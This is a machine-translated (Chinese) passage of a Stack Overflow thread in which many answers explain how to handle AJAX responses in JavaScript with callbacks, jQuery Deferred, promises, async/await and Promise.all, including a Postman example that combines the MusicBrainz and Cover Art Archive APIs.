对于我们的牛奶和咖啡，我们设计`order_milk`返回一个牛奶到达的承诺，然后指定`put_in_coffee`为一个`then`动作，如下所示：

```
order_milk() . then(put_in_coffee) 
```

这样做的一个优点是我们可以将它们串在一起以创建未来发生的序列（“链接”）：

```
order_milk() . then(put_in_coffee) . then(drink_coffee) 
```

让我们将承诺应用于您的特定问题。我们将把我们的请求逻辑包装在一个函数中，该函数返回一个承诺：

```
function get_data() {
  return $.ajax('/foo.json');
} 
```

实际上，我们所做的只是`return`在对`$.ajax`. 这是可行的，因为 jQuery`$.ajax`已经返回了一种类似于 Promise 的东西。（实际上，在不深入细节的情况下，我们更愿意包装这个调用以便返回一个真正的承诺，或者使用一些替代方法`$.ajax`。）现在，如果我们想要加载文件并等待它完成并且然后做一些事情，我们可以简单地说

```
get_data() . then(do_something) 
```

例如，

```
get_data() .
  then(function(data) { console.log(data); }); 
```

在使用 Promise 时，我们最终会将大量函数传递给`then`，因此使用更紧凑的 ES6 风格的箭头函数通常很有帮助：

```
get_data() .
  then(data => console.log(data)); 
```

### `async`关键字_

但是，如果是同步的，必须以一种方式编写代码，而如果是异步的，则必须以一种完全不同的方式编写代码，这仍然有些令人不满意的地方。对于同步，我们写

```
a();
b(); 
```

但是如果`a`是异步的，我们必须写承诺

```
a() . then(b); 
```

上面，我们说过，“JavaScript 无法知道它需要**等待**第一个调用完成才能执行第二个调用”。如果有某种方法可以告诉 JavaScript，那不是很好**吗**？事实证明，`await`在一种称为“异步”函数的特殊类型的函数中使用了关键字。此功能是即将推出的 ECMAScript (ES) 版本的一部分，但它已经在 Babel 等转译器中[提供](https://en.wikipedia.org/wiki/Babel_(transcompiler))了正确的预设。这使我们可以简单地编写

```
async function morning_routine() {
  var milk   = await order_milk();
  var coffee = await put_in_coffee(milk);
  await drink(coffee);
} 
```

在您的情况下，您可以编写类似

```
async function foo() {
  data = await get_data();
  console.log(data);
} 
```

* * *

## 回答 #23

> 赞同：40
> 
> 时间：2015-09-23T22:52:03.907

**简短回答**：您的`foo()`方法立即返回，而调用*在函数返回后*`$ajax()`异步执行。然后问题是如何或在哪里存储异步调用返回后检索到的结果。

 *在这个线程中已经给出了几个解决方案。也许最简单的方法是将对象传递给`foo()`方法，并在异步调用完成后将结果存储在该对象的成员中。

```
function foo(result) {
    $.ajax({
        url: '...',
        success: function(response) {
            result.response = response;   // Store the async result
        }
    });
}

var result = { response: null };   // Object to hold the async result
foo(result);                       // Returns before the async completes 
```

请注意，调用`foo()`仍然不会返回任何有用的信息。但是，异步调用的结果现在将存储在`result.response`.

* * *

## 回答 #24

> 赞同：40
> 
> 时间：2016-08-13T09:36:41.877

## 以下是一些处理异步请求的方法：

1.  [浏览器承诺对象](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)
2.  [Q](https://github.com/kriskowal/q) - JavaScript 的 promise 库
3.  [A+ Promises.js](https://www.promisejs.org/)
4.  [jQuery 延迟](https://api.jquery.com/jquery.deferred/)
5.  [XMLHttpRequest API](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)
6.  使用回调概念 - 作为第一个答案中的实现

### 示例：jQuery 延迟实现以处理多个请求

```
var App = App || {};

App = {
    getDataFromServer: function(){

      var self = this,
                 deferred = $.Deferred(),
                 requests = [];

      requests.push($.getJSON('request/ajax/url/1'));
      requests.push($.getJSON('request/ajax/url/2'));

      $.when.apply(jQuery, requests).done(function(xhrResponse) {
        return deferred.resolve(xhrResponse.result);
      });
      return deferred;
    },

    init: function(){

        this.getDataFromServer().done(_.bind(function(resp1, resp2) {

           // Do the operations which you wanted to do when you
           // get a response from Ajax, for example, log response.
        }, this));
    }
};
App.init();
```

* * *

## 回答 #25

> 赞同：39
> 
> 时间：2017-04-24T08:09:03.637

使用`callback()`里面的一个函数就`foo()`成功了。用这种方法试试。它简单易懂。

```
var lat = "";
var lon = "";

function callback(data) {
    lat = data.lat;
    lon = data.lon;
}

function getLoc() {
    var url = "http://ip-api.com/json"
    $.getJSON(url, function(data) {
        callback(data);
    });
}

getLoc(); 
```

* * *

## 回答 #26

> 赞同：34
> 
> 时间：2021-05-22T10:24:15.720

### 1\. 第一个绊脚石

对于其他许多人来说，我遇到的异步调用一开始是令人费解的。
我不记得细节，但我可能尝试过类似的东西：

```
let result;

$.ajax({
  url: 'https://jsonplaceholder.typicode.com/todos/1',
  success: function (response) {
    console.log('\nInside $.ajax:');
    console.log(response);
    result = response;
  }
});

console.log('Finally, the result: ' + result);
```

```
.as-console-wrapper { max-height: 100% !important; top: 0; }
```

```
<script src=
"https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
```

*哎呀！*`console.log('Finally, the result: ' + result);` 我认为*最后*打印的行的 输出实际上是在另一个输出*之前*打印的！– 它不包含结果：它只是打印`undefined`. ¹ 怎么来的？

**有用的见解**

我清楚地记得我的第一个*啊哈！*关于如何理解异步调用的时刻。
正是[这条评论](https://stackoverflow.com/q/44298196#comment75602602_44298196)说：
*您实际上不想**从**回调中获取数据；
您想将需要数据的操作**放入**回调中！* ²
这在上面的例子中很明显。*但是，在处理响应完成后*的异步调用之后
仍然可以编写代码吗？

 *### 2\. 纯 JavaScript 和回调函数

答案是*肯定的！*- 有可能的。
一种替代方法是在延续传递样式中 使用*回调函数：* ³

```
const url = 'https://jsonplaceholder.typicode.com/todos/2';

function asynchronousCall (callback) {
  const request = new XMLHttpRequest();
  request.open('GET', url);
  request.send();
  request.onload = function () {
    if (request.readyState === request.DONE) {
      console.log('The request is done. Now calling back.');
      callback(request.responseText);
    }
  };
}

asynchronousCall(function (result) {
  console.log('This is the start of the callback function. Result:');
  console.log(result);
  console.log('The callback function finishes on this line. THE END!');
});

console.log('LAST in the code, but executed FIRST!');
```

```
.as-console-wrapper { max-height: 100% !important; top: 0; }
```

注意函数`asynchronousCall`是怎样的`void`。它什么也不返回。相反，通过`asynchronousCall`使用匿名回调函数 ( `asynchronousCall(function (result) {...`) 调用，此函数对结果执行所需的操作，但仅*在*请求完成后 -`responseText`可用时。

运行上面的代码片段显示了我可能不想 在异步调用*之后*编写任何代码（例如 line `LAST in the code, but executed FIRST!`）。
*为什么？*– 因为这样的代码将在异步调用传递任何响应数据*之前发生。**在将代码*与*输出*
进行比较时，这样做势必会造成混淆。

 **### `.then()`3\. 用– 或`async`/承诺`await`

该`.then()`构造于*2015 年 6 月在 ECMA-262 第 6 版中*引入，而`async`/`await`构造于*2017 年 6 月在 ECMA-262 第 8 版中*引入。
下面的代码仍然是纯 JavaScript，将老式的 *XMLHttpRequest*替换为*Fetch*。 ⁴

```
fetch('http://api.icndb.com/jokes/random')
  .then(response => response.json())
  .then(responseBody => {
    console.log('.then() - the response body:');
    console.log(JSON.stringify(responseBody) + '\n\n');
  });

async function receiveAndAwaitPromise () {
  const responseBody =
    (await fetch('http://api.icndb.com/jokes/random')).json();
  console.log('async/await:');
  console.log(JSON.stringify(await responseBody) + '\n\n');
}

receiveAndAwaitPromise();
```

```
.as-console-wrapper { max-height: 100% !important; top: 0; }
```

如果您决定使用`async`/`await` 构造，则需要警告。请注意上面的代码片段中*两个*地方`await`需要如何。如果一开始就忘记了，就没有输出。如果第二次忘记了，则唯一的输出将是空对象 （或或）。 忘记函数的前缀可能是最糟糕的——输出将是——没有提到*缺少*的关键字。*`{}``[object Object]``[object Promise]`
`async``"SyntaxError: missing ) in parenthetical"` *`async`**

 **### 4\. Promise.all – URL 数组⁵

假设我们需要请求一大堆 URL。我可以发送一个请求，等待它响应，然后发送下一个请求，等待*它*响应，依此类推……
啊！– 这可能需要很长时间。如果我可以一次发送它们*，*然后等待最慢响应到达所花费的时间不是更好吗？

作为一个简化的例子，我将使用：

```
urls = ['https://jsonplaceholder.typicode.com/todos/2',
        'https://jsonplaceholder.typicode.com/todos/3'] 
```

两个 URL 的 JSON：

```
{"userId":1,"id":2,"title":"quis ut nam facilis et officia qui",
 "completed":false}
{"userId":1,"id":3,"title":"fugiat veniam minus","completed":false} 
```

目标是获取一个对象数组，其中每个对象都包含`title` 来自相应 URL 的值。

为了让它更有趣一点，我假设已经有一个*名称*数组，我希望 URL 结果数组（*标题*）与之合并：

```
namesonly = ['two', 'three'] 
```

所需的输出是将 mashup 组合`namesonly`成`urls`一个 *对象数组*：

```
[{"name":"two","loremipsum":"quis ut nam facilis et officia qui"},
{"name":"three","loremipsum":"fugiat veniam minus"}] 
```

我已将名称更改`title`为`loremipsum`.

```
const namesonly = ['two','three'];

const urls = ['https://jsonplaceholder.typicode.com/todos/2',
  'https://jsonplaceholder.typicode.com/todos/3'];

Promise.all(urls.map(url => fetch(url)
  .then(response => response.json())
  .then(responseBody => responseBody.title)))
  .then(titles => {
    const names = namesonly.map(value => ({ name: value }));
    console.log('names: ' + JSON.stringify(names));
    const latins = titles.map(value => ({ loremipsum: value }));
    console.log('latins:\n' + JSON.stringify(latins));
    const result =
      names.map((item, i) => Object.assign({}, item, latins[i]));
    console.log('result:\n' + JSON.stringify(result));
  });
```

```
.as-console-wrapper { max-height: 100% !important; top: 0; }
```

上述所有示例都很简短，简洁地传达了异步调用如何用于玩具 API。使用小型 API 可以很好地解释概念和工作代码，但这些示例可能有点枯燥。

下一节将展示一个更现实的示例，说明如何组合 API 以创建更有趣的输出。

### 5\. 如何在 Postman ^(6中可视化混搭)

[MusicBrainz API](http://musicbrainz.org/doc/Development/XML_Web_Service/Version_2) 包含有关艺术家和乐队的信息。*一个例子——英国摇滚乐队酷玩*
乐队的请求是：[http](http://musicbrainz.org/ws/2/artist/cc197bad-dc9c-440d-a5b5-d52ba2e14234?&fmt=json&inc=url-rels+release-groups) ://musicbrainz.org/ws/2/artist/cc197bad-dc9c-440d-a5b5-d52ba2e14234?&fmt=json&inc=url-rels+release-groups 。 JSON 响应包含 - 除其他外 - 乐队最早的 25 张专辑标题。此信息在数组中。这个数组的开始，包括它的第一个对象是： *`release-groups`*

 *```
...
  "release-groups": [
    {
      "id": "1dc4c347-a1db-32aa-b14f-bc9cc507b843",
      "secondary-type-ids": [],
      "first-release-date": "2000-07-10",
      "primary-type-id": "f529b476-6e62-324f-b0aa-1f3e33d313fc",
      "disambiguation": "",
      "secondary-types": [],
      "title": "Parachutes",
      "primary-type": "Album"
    },
... 
```

这个 JSON 片段显示 Coldplay 的第一张专辑是*Parachutes*。它还给出了一个`id`，在这种情况下`1dc4c347-a1db-32aa-b14f-bc9cc507b843`，它是专辑的唯一标识符。

此标识符可用于在[封面艺术档案 API](https://wiki.musicbrainz.org/Cover_Art_Archive/API)中进行查找：http :
[//coverartarchive.org/release-group/1dc4c347-a1db-32aa-b14f-bc9cc507b843](http://coverartarchive.org/release-group/1dc4c347-a1db-32aa-b14f-bc9cc507b843)。 ⁷

对于每张专辑，JSON 响应都包含一些图像，其中一张是专辑的封面。对上述请求的响应的前几行：

```
{
  "images": [
    {
      "approved": true,
      "back": false,
      "comment": "",
      "edit": 22132705,
      "front": true,
      "id": 4086974851,
      "image": "http://coverartarchive.org/release/435fc965-9121-461e-b8da-d9b505c9dc9b/4086974851.jpg",
      "thumbnails": {
        "250": "http://coverartarchive.org/release/435fc965-9121-461e-b8da-d9b505c9dc9b/4086974851-250.jpg",
        "500": "http://coverartarchive.org/release/435fc965-9121-461e-b8da-d9b505c9dc9b/4086974851-500.jpg",
        "1200": "http://coverartarchive.org/release/435fc965-9121-461e-b8da-d9b505c9dc9b/4086974851-1200.jpg",
        "large": "http://coverartarchive.org/release/435fc965-9121-461e-b8da-d9b505c9dc9b/4086974851-500.jpg",
= = >   "small": "http://coverartarchive.org/release/435fc965-9121-461e-b8da-d9b505c9dc9b/4086974851-250.jpg"
    },
... 
```

这里感兴趣的是线路 `"small": "http://coverartarchive.org/release/435fc965-9121-461e-b8da-d9b505c9dc9b/4086974851-250.jpg"`。*该 URL 是Parachutes*专辑
封面的直接链接。

 ***创建和可视化混搭的代码**

总体任务是使用 Postman 可视化乐队的所有专辑标题和封面。如何编写代码来实现这一点已经在 对*如何在 Postman 中可视化 API mashup*的问题 [的回答中进行了相当详细的描述。](https://stackoverflow.com/a/67824483)– 因此，我将避免在这里进行冗长的讨论，而仅提供代码和结果的屏幕截图：

 *```
const lock = setTimeout(() => {}, 43210);
const albumsArray = [];
const urlsArray = [];
const urlOuter = 'https://musicbrainz.org/ws/2/artist/' +
  pm.collectionVariables.get('MBID') + '?fmt=json&inc=url-rels+release-groups';
pm.sendRequest(urlOuter, (_, responseO) => {
  const bandName = responseO.json().name;
  const albums = responseO.json()['release-groups'];
  for (const item of albums) {
    albumsArray.push(item.title);
    urlsArray.push('https://coverartarchive.org/release-group/' + item.id);
  }
  albumsArray.length = urlsArray.length = 15;
  const images = [];
  let countDown = urlsArray.length;
  urlsArray.forEach((url, index) => {
    asynchronousCall(url, imageURL => {
      images[index] = imageURL;
      if (--countDown === 0) { // Callback for ALL starts on next line.
        clearTimeout(lock); // Unlock the timeout.
        const albumTitles = albumsArray.map(value => ({ title: value }));
        const albumImages = images.map(value => ({ image: value }));
        const albumsAndImages = albumTitles.map(
          (item, i) => Object.assign({}, item, albumImages[i]));
        const template = `<table>
          <tr><th>` + bandName + `</th></tr>
          {{#each responseI}}
          <tr><td>{{title}}<br><img src="{{image}}"></td></tr>
          {{/each}}
        </table>`;
        pm.visualizer.set(template, { responseI: albumsAndImages });
      }
    });
  });
  function asynchronousCall (url, callback) {
    pm.sendRequest(url, (_, responseI) => {
      callback(responseI.json().images.find(obj => obj.front === true)
        .thumbnails.small); // Individual callback.
    });
  }
}); 
```

**结果和文档**

[![Postman 中的结果和文档](../Images/68a9ce75e8093eeee30920ab771f0de7.png "Postman 中的结果和文档")](https://i.imgur.com/NtwLtvM.png)

**如何下载和运行 Postman Collection**

运行 Postman Collection 应该很简单。
假设您使用[的是桌面版 Postman](https://www.postman.com/downloads/)，请执行以下操作：

1.  下载
    [http://henke.atwebpages.com/postman/mbid/MusicBands.pm_coll.json](http://henke.atwebpages.com/postman/mbid/MusicBands.pm_coll.json)
    并将其保存 在硬盘上合适的位置。

2.  在 Postman 中，*`Ctrl`+ `O`> 上传文件 > `MusicBands.pm_coll.json`> 导入*。
    您现在应该可以`MusicBands`在 Postman 中看到您的收藏。

3.  *收藏 > `MusicBands`> `DummyRequest`>**发送***。 ⁸

4.  在 Postman 响应正文中，单击*Visualize*。

5.  您现在应该可以滚动 15 个专辑，如上面的屏幕截图所示。

### 参考

*   [如何从异步调用返回响应？](https://stackoverflow.com/q/14220321)
*   [关于异步调用的一些问答](https://stackoverflow.com/a/67662000)
*   [使用纯 JavaScript 和回调函数](https://stackoverflow.com/a/16825593)
*   [续传风格](https://en.wikipedia.org/wiki/Continuation-passing_style)
*   [XMLHttpRequest：onload 与 onreadystatechange](https://stackoverflow.com/a/19247992)
*   [XMLHttpRequest.responseText](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText)
*   [一个例子展示`async`/`await`](https://stackoverflow.com/a/48415961)
*   [拿来](https://github.github.io/fetch/)
*   [承诺](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)
*   [XMLHttpRequest 标准](https://xhr.spec.whatwg.org/)
*   [获取标准](https://fetch.spec.whatwg.org/)
*   [Web 超文本应用技术工作组 (WHATWG)](https://whatwg.org/news/start)
*   [指向 ECMA 规范的链接](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Language_Resources)
*   [将值数组转换为对象数组](https://stackoverflow.com/a/49602789)
*   [如何使用 Promise.all 获取 URL 数组？](https://stackoverflow.com/a/67671337)
*   [MusicBrainz API 的文档](http://musicbrainz.org/doc/Development/XML_Web_Service/Version_2)
*   [封面艺术档案 API 的文档](https://wiki.musicbrainz.org/Cover_Art_Archive/API)
*   [如何在 Postman 中可视化 API 混搭？](https://stackoverflow.com/a/67824483)

* * *

¹原发帖人表述为：*都归来 `undefined`*。
²如果您认为异步调用令人困惑，请考虑查看[一些有关异步调用的问题和答案](https://stackoverflow.com/a/67662000)，看看是否有帮助。
³这个名称与 *AJAX中的**X*`XMLHttpRequest`一样具有误导性——如今，Web API 的数据格式普遍是 JSON，而不是 XML。⁴ [Fetch](https://github.github.io/fetch/) 返回一个[Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)。我惊讶地发现*XMLHttpRequest*和*Fetch*都不是*ECMAScript的一部分* **^(***标准。JavaScript 可以在这里访问它们的原因是 Web 浏览器提供了它们。 2004 年 6 月成立[的 Web 超文本应用程序技术工作组 (WHATWG)](https://whatwg.org/news/start)都支持 [Fetch 标准](https://fetch.spec.whatwg.org/)和 [XMLHttpRequest 标准。](https://xhr.spec.whatwg.org/) ⁵本节借鉴了 [How can I fetch a array of URLs with Promise.all？](https://stackoverflow.com/a/67671337). ⁶本节主要依赖于 [如何在 Postman 中可视化 API mashup？](https://stackoverflow.com/a/67824483). ⁷此 URL 会自动重定向到： [https](https://ia800503.us.archive.org/29/items/mbid-435fc965-9121-461e-b8da-d9b505c9dc9b/index.json) ://ia800503.us.archive.org/29/items/mbid-435fc965-9121-461e-b8da-d9b505c9dc9b/index.json 。⁸如果出现错误，
 ^(^(^(^(*运行脚本时出现问题*，请再次点击**发送**。))))***)**

 *** * *

## 回答 #27

> 赞同：31
> 
> 时间：2018-12-07T14:10:23.677

# 使用承诺

这个问题最完美的答案是使用`Promise`.

```
function ajax(method, url, params) {
  return new Promise(function(resolve, reject) {
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
      resolve(this.responseText);
    };
    xhr.onerror = reject;
    xhr.open(method, url);
    xhr.send(params);
  });
} 
```

## 用法

```
ajax("GET", "/test", "acrive=1").then(function(result) {
    // Code depending on result
})
.catch(function() {
    // An error occurred
}); 
```

* * *

# 可是等等...！

使用 Promise 有问题！

## 为什么要使用我们自己的自定义 Promise？

我使用这个解决方案有一段时间了，直到我发现旧浏览器中存在错误：

> 未捕获的 ReferenceError：未定义承诺

所以我决定在JavaScript 编译器**下面实现我自己的 ES3 Promise 类，如果它没有定义的话。**只需将此代码添加到您的主代码之前，然后安全地使用 Promise！

```
if(typeof Promise === "undefined"){
    function _classCallCheck(instance, Constructor) {
        if (!(instance instanceof Constructor)) {
            throw new TypeError("Cannot call a class as a function");
        }
    }
    var Promise = function () {
        function Promise(main) {
            var _this = this;
            _classCallCheck(this, Promise);
            this.value = undefined;
            this.callbacks = [];
            var resolve = function resolve(resolveValue) {
                _this.value = resolveValue;
                _this.triggerCallbacks();
            };
            var reject = function reject(rejectValue) {
                _this.value = rejectValue;
                _this.triggerCallbacks();
            };
            main(resolve, reject);
        }
        Promise.prototype.then = function then(cb) {
            var _this2 = this;
            var next = new Promise(function (resolve) {
                _this2.callbacks.push(function (x) {
                    return resolve(cb(x));
                });
            });
            return next;
        };
        Promise.prototype.catch = function catch_(cb) {
            var _this2 = this;
            var next = new Promise(function (reject) {
                _this2.callbacks.push(function (x) {
                    return reject(cb(x));
                });
            });
            return next;
        };
        Promise.prototype.triggerCallbacks = function triggerCallbacks() {
            var _this3 = this;
            this.callbacks.forEach(function (cb) {
                cb(_this3.value);
            });
        };
        return Promise;
    }();
} 
```

* * *

## 回答 #28

> 赞同：30
> 
> 时间：2017-07-05T20:28:42.720

当然有很多方法，比如同步请求、promise，但根据我的经验，我认为你应该使用回调方法。JavaScript 的异步行为是很自然的。

因此，您的代码片段可以重写为有点不同：

```
function foo() {
    var result;

    $.ajax({
        url: '...',
        success: function(response) {
            myCallback(response);
        }
    });

    return result;
}

function myCallback(response) {
    // Does something.
} 
```

* * *

## 回答 #29

> 赞同：30
> 
> 时间：2018-01-13T19:13:20.800

问题是：

> 如何从异步调用返回响应？

这*可以*解释为：

> 如何使**异步**代码看起来**同步**？

解决方案是避免回调，并结合使用**Promises**和**async/await**。

我想举一个 Ajax 请求的例子。

（虽然可以用 JavaScript 写，但我更喜欢用 Python 写，然后用[Transcrypt](https://github.com/QQuick/Transcrypt)编译成 JavaScript 。这样就够清楚了。）

让我们首先启用 jQuery 的使用，使其`$`可用`S`：

```
__pragma__ ('alias', 'S', '$') 
```

定义一个返回**Promise**的函数，在本例中为 Ajax 调用：

```
def read(url: str):
    deferred = S.Deferred()
    S.ajax({'type': "POST", 'url': url, 'data': { },
        'success': lambda d: deferred.resolve(d),
        'error': lambda e: deferred.reject(e)
    })
    return deferred.promise() 
```

使用**异步**代码，就好像它是**同步**的：

```
async def readALot():
    try:
        result1 = await read("url_1")
        result2 = await read("url_2")
    except Exception:
        console.warn("Reading a lot failed") 
```

* * *

## 回答 #30

> 赞同：28
> 
> 时间：2018-05-04T15:56:07.643

不要向你扔代码，有两个概念是理解 JavaScript 如何处理回调和异步性的关键（这甚至是一个词吗？）

## **[事件循环和并发模型](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop)**

您需要注意三件事；**队列; [事件循环](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop#Event_loop)和堆栈**

从广义上讲，事件循环就像项目经理，它不断地监听任何想要运行的函数，并在队列和堆栈之间进行通信。

```
while (queue.waitForMessage()) {
  queue.processNextMessage();
} 
```

一旦它接收到一条消息来运行某些东西，它就会将它添加到队列中。队列是等待执行的事物的列表（例如您的 AJAX 请求）。想象一下：

1.  使用 foobarFunc 调用 foo.com/api/bar
2.  去执行一个无限循环......等等

当其中一条消息要执行时，它会从队列中弹出消息并创建一个堆栈，堆栈是 JavaScript 执行消息中的指令所需执行的所有内容。所以在我们的例子中，它被告知调用`foobarFunc`

```
function foobarFunc (var) {
  console.log(anotherFunction(var));
} 
```

所以 foobarFunc 需要执行的任何东西（在我们的例子中`anotherFunction`）都会被压入堆栈。执行，然后忘记 - 事件循环将移动到队列中的下一个事物（或侦听消息）

**这里的关键是执行顺序。那是**

## **什么时候运行**

当您使用 AJAX 向外部方进行调用或运行任何异步代码（例如 setTimeout）时，JavaScript 依赖于响应才能继续。

最大的问题是它什么时候会得到回应？答案是我们不知道——所以事件循环正在等待该消息说“嘿，快跑吧”。如果 JavaScript 只是同步地等待该消息，您的应用程序将冻结并且它会很糟糕。因此 JavaScript 继续执行队列中的下一项，同时等待消息被添加回队列。

这就是为什么我们使用称为**回调**的异步功能。- 一个函数或处理程序，当传递给另一个函数时，将在以后执行。Promise使用回调（例如传递给的函数[）](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)`.then()`作为以更线性的方式推理这种异步行为的一种方式。承诺是一种说“我*承诺在某个时候返回某些东西*”的方式，而回调是我们处理最终返回的值的方式。jQuery 使用称为`deffered.done` `deffered.fail`and的特定回调`deffered.always`（其中包括）。[你可以在这里](https://api.jquery.com/category/deferred-object/)看到它们

因此，您需要做的是传递一个函数，该函数承诺在某个时刻使用传递给它的数据执行。

因为回调不会立即执行，而是稍后执行，因此将引用传递给未执行的函数很重要。所以

```
function foo(bla) {
  console.log(bla)
} 
```

所以大多数时候（但并非总是）你不会`foo`通过`foo()`

希望这会有些意义。当您遇到类似这样令人困惑的事情时 - 我强烈建议您完整阅读文档以至少了解它。它会让你成为一个更好的开发者。

* * *

## 回答 #31

> 赞同：27
> 
> 时间：2020-01-19T22:23:07.037

在阅读了这里的所有回复并结合我的经验之后，我想继续详细介绍`callback, promise and async/await`JavaScript 中的异步编程。

**1）回调：回调**的根本原因是运行代码以响应事件（参见下面的示例）。我们每次都在 JavaScript 中使用回调。

```
const body = document.getElementsByTagName('body')[0];
function callback() {
  console.log('Hello');
}
body.addEventListener('click', callback); 
```

但是如果你必须在下面的示例中使用许多嵌套回调，那么代码重构将是非常糟糕的。

```
asyncCallOne(function callback1() {
  asyncCallTwo(function callback2() {
    asyncCallThree(function callback3() {
        ...
    })
  })
}) 
```

**2) Promise：**一种语法 ES6 - Promise 解决了回调地狱问题！

```
const myFirstPromise = new Promise((resolve, reject) => {
  // We call resolve(...) when what we were doing asynchronously was successful, and reject(...) when it failed.
  // In this example, we use setTimeout(...) to simulate async code.
  // In reality, you will probably be using something like XHR request or an HTML5 API.
  setTimeout(() => {
    resolve("Success!")  // Yay! Everything went well!
  }, 250)
})

myFirstPromise
  .then((res) => {
    return res.json();
  })
  .then((data) => {
    console.log(data);
  })
  .catch((e) => {
    console.log(e);
  }); 
```

myFirstPromise 是一个 Promise 实例，代表异步代码的过程。resolve 函数表示 Promise 实例已完成。之后，我们可以在 promise 实例上调用 .then() （你想要的 .then 链）和 .catch() ：

```
then — Runs a callback you pass to it when the promise has fulfilled.
catch — Runs a callback you pass to it when something went wrong. 
```

**3) Async/Await：**一种新语法 ES6 - Await 基本上是 Promise 的语法糖！

Async 函数为我们提供了简洁明了的语法，使我们能够编写更少的代码来完成与使用 Promise 相同的结果。**Async/Await 看起来**和同步代码很像，同步代码更容易读写。要使用 Async/Await 捕获错误，我们可以使用 block `try...catch`。在这里，您不需要编写 Promise 语法的 .then() 链。

```
const getExchangeRate = async () => {
  try {
    const res = await fetch('https://getExchangeRateData');
    const data = await res.json();
    console.log(data);
  } catch (err) {
    console.error(err);
  }
}

getExchangeRate(); 
```

> 结论：这完全是你应该理解的 JavaScript 异步编程的三种语法。**因此，如果可能的话，我建议您应该使用“promise”或“async/await”来重构您的异步代码（主要用于 XHR 请求）**！

* * *

## 回答 #32

> 赞同：26
> 
> 时间：2018-01-24T06:18:55.310

使用 ES2017，您应该将其作为函数声明。

```
async function foo() {
  var response = await $.ajax({url: '...'})
  return response;
} 
```

并像这样执行它。

```
(async function() {
  try {
    var result = await foo()
    console.log(result)
  } catch (e) {}
})() 
```

或者 Promise 语法。

```
foo().then(response => {
  console.log(response)

}).catch(error => {
  console.log(error)

}) 
```

演示上述代码的堆栈片段。

```
// The function declaration:
async function foo() {
  var response = await $.ajax({
    url: 'https://jsonplaceholder.typicode.com/todos/1'
  })
  return response;
}

// Execute it like this:
(async function() {
  try {
    var result = await foo()
    console.log(result)
  } catch (e) {}
})()

// Or use Promise syntax:
foo().then(response => {
  console.log(response)
}).catch(error => {
  console.log(error)
})
```

```
.as-console-wrapper { max-height: 100% !important; top: 0; }
```

```
<script src=
"https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
```

* * *

## 回答 #33

> 赞同：24
> 
> 时间：2018-07-12T21:48:15.560

这是一个有效的示例：

```
const validateName = async userName => {
  const url = "https://jsonplaceholder.typicode.com/todos/1";
  try {
    const response = await axios.get(url);
    return response.data
  } catch (err) {
    return false;
  }
};

validateName("user")
 .then(data => console.log(data))
 .catch(reason => console.log(reason.message))
```

```
.as-console-wrapper { max-height: 100% !important; top: 0; }
```

```
<script src=
"https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
```

* * *

## 回答 #34

> 赞同：19
> 
> 时间：2019-06-11T07:56:10.160

## 等待

请求以异步方式工作，因此您无法像在典型代码中那样同步读取数据。但是，使用`async/await`您可以创建看起来接近/类似于通常的同步/顺序样式的异步代码。处理响应数据的代码需要由`async`函数包装（`load`在下面的代码片段中），并且在其中您需要在`await`之前添加关键字`foo()`（也使用`async/await`）。

```
async function foo() {
  var url = 'https://jsonplaceholder.typicode.com/todos/1';
  var result = (await fetch(url)).text(); // Or .json()
  return result;
}

async function load() {
  var result = await foo();
  console.log(result);
}

load();
```

请记住，`async`函数总是（隐式地）将其结果包装到一个 Promise 中（因此它返回一个 Promise）。

* * *

## 回答 #35

> 赞同：15
> 
> 时间：2017-10-25T03:22:21.970

**在看树木之前，让我们先看看森林。**

这里有很多详细的信息性答案，我不会重复任何一个。JavaScript 编程的关键是首先拥有**正确的整体执行思维模型**。

1.  您的入口点作为事件的结果执行。例如，带有代码的脚本标签被加载到浏览器中。（因此，如果页面需要首先构造 DOM 元素等，您可能需要关注页面是否准备好运行您的代码。）
2.  您的代码执行完成——无论它进行多少异步调用——而不执行**任何**回调，包括 XHR 请求、设置超时、DOM 事件处理程序等。每个等待执行的回调将位于队列中，等待在其他触发的事件都完成执行后轮到他们运行。
3.  对 XHR 请求的每个单独的回调、设置超时或 DOM 事件一旦被调用就会运行到完成。

好消息是，如果你很好地理解了这一点，你将永远不必担心比赛条件。您首先应该考虑如何组织代码作为对不同离散事件的响应，以及如何将它们串在一起形成一个逻辑序列。你可以使用 Promise 或更高级别的新 async/await 作为工具来达到这个目的，或者你可以自己动手。

但是，在您对实际的问题领域感到满意之前，您不应该使用任何战术工具来解决问题。绘制这些依赖关系的地图，以了解何时需要运行什么。尝试对所有这些回调采取一种特别的方法是不会为您提供很好的服务。

* * *

## 回答 #36

> 赞同：11
> 
> 时间：2020-03-03T06:25:29.670

您无法直接从函数返回 Ajax 响应的结果。原因是 Ajax 调用（`$.get()`或`$.post()`）是​​异步的，调用封装 Ajax 调用的函数甚至会在响应呈现之前返回。

在这种情况下，唯一的选择是返回一个 promise 对象，在响应到达时被解析。

有两种方法可以解决上述问题。两者都使用了一个承诺。

下面的代码片段包含一个 JSON URL。两者都可以工作，并且可以直接复制到[JSFiddle](https://en.wikipedia.org/wiki/JSFiddle)并进行测试。

**选项 #1 - 直接从 foo 方法返回 Ajax 调用。**
在最新版本的 jQuery 中，Ajax 调用会返回一个 Promise 对象，该对象可以使用`.then`函数来解析。在代码中，`.then`函数前面是要解析的回调函数，`foo()`在这种情况下。

```
 // Declare function foo
   function foo(url)
   {
     return $.get(url);
   }

   // Invoke the foo function, which returns a promise object
   // the 'then' function accepts the call back to the resolve function
   foo('https://jsonplaceholder.typicode.com/todos/1')
     .then(function(response)
     {
       console.log(response);
     })
```

```
.as-console-wrapper { max-height: 100% !important; top: 0; }
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
```

**选项 #2 - 声明一个 Promise 对象并返回它。**
